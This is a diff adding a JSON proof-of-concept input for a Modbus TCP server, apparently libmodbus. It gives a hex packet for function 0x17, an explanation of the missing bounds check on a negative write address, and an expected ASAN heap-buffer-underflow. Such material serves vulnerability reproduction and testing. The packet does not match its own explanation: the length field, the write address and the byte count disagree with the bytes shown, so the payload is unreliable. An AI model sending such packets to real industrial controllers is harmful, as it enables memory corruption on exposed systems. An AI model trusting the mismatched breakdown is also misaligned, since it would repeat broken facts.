@@ -1,0 +1,5 @@
+{
+  "hex_bytes": "00 01 00 00 00 17 01 17 00 00 00 01 00 01 00 00 00 01 00 01 00 00 00 01 00 01 00 00 00 01 00 01 00 00 00 01 00 01",
+  "explanation": "MBAP Header: 00 01 (transaction ID), 00 00 (protocol ID), 00 17 (length = 23 bytes following). PDU: 01 (unit ID), 17 (function code 0x17). Read parameters: 00 00 (read start address = 0, valid), 00 01 (read quantity = 1, valid). Write parameters: 00 00 (write start address = 0, which is below start_registers=352 → negative mapping_address_write), 00 01 (write quantity = 1, valid), 00 01 (write byte count = 1). Write data: 00 (single byte to write). The guard checks mapping_address (0) >= 0 twice but never checks mapping_address_write (0 - 352 = -352), allowing the negative index access.",
+  "expected_effect": "Sanitizer (e.g., ASAN) should report a heap-buffer-underflow when tab_registers[-352] is accessed during the write loop, as the negative index is out-of-bounds."
+}
